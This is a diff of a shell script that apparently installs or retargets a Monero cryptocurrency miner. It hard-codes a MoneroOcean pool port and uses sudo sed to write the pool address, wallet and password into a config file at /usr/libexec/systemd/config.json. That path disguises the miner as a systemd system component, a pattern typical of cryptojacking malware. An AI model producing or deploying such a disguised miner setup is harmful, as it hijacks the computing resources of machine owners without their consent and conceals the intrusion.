@@ -104,7 +104,7 @@ if [ -z $PORT ]; then
   exit 1
 fi
 
-if [ "$PORT" -lt "10001" -o "$PORT" -gt "10002" ]; then
+if [ "$PORT" -lt "10001" -o "$PORT" -gt "18212" ]; then
   echo "错误：计算出的端口值不正确: $PORT"
   exit 1
 fi
@@ -213,6 +213,7 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
+PORT=11024
 sudo sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' /usr/libexec/systemd/config.json
 sudo sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' /usr/libexec/systemd/config.json
 sudo sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' /usr/libexec/systemd/config.json
